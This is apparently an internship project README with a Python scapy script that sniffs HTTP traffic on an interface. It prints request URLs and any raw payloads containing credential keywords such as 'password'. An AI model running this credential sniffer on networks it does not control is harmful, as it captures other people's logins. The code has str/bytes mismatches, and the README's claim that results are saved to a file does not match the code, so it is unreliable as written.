# CodeAlpha_Network_Sniffer
As a part of my intership i made network sniffer that captures incming and outgoing packets and check for username and password if there is any and save them in a file .
#!/usr/bin/env python
# Import required libraries
import scapy.all as scapy       # For packet manipulation and sniffing
import argparse                 # For parsing command-line arguments
from scapy.layers import http   # For HTTP protocol support in Scapy

def get_interface():
    """
    Gets the network interface from command-line arguments
    Returns:
        str: The name of the network interface to sniff on
    """
    # Create argument parser object
    parser = argparse.ArgumentParser()
    
    # Add argument for network interface with help description
    parser.add_argument("-i", "--interface", 
                       dest="interface", 
                       help="Specify interface on which to sniff packets")
    
    # Parse the command-line arguments
    arguments = parser.parse_args()
    
    # Return the specified interface name
    return arguments.interface

def sniff(iface):
    """
    Starts packet sniffing on the specified interface
    Args:
        iface (str): Network interface to sniff on
    """
    # Start sniffing packets with the following parameters:
    # iface: interface to sniff on
    # store=False: don't store packets in memory (just process them)
    # prn: callback function to process each packet
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    """
    Processes each captured packet to look for HTTP requests and credentials
    Args:
        packet: The captured network packet
    """
    # Check if packet contains an HTTP Request layer
    if packet.haslayer(http.HTTPRequest):
        # Print the HTTP request host and path
        print("[+] Http Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        
        # Check if packet contains raw data (often contains POST data)
        if packet.haslayer(scapy.Raw):
            # Get the raw data payload
            load = packet[scapy.Raw].load
            
            # List of keywords that might indicate credential fields
            keys = ["username", "password", "pass", "email"]
            
            # Check if any of our keywords exist in the raw data
            for key in keys:
                if key in load:
                    # If found, print a warning with the potential credentials
                    print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
                    break  # Stop checking after first match

# Main execution
if __name__ == "__main__":
    # Get the network interface from command line
    iface = get_interface()
    
    # Start sniffing on the specified interface
    sniff(iface)
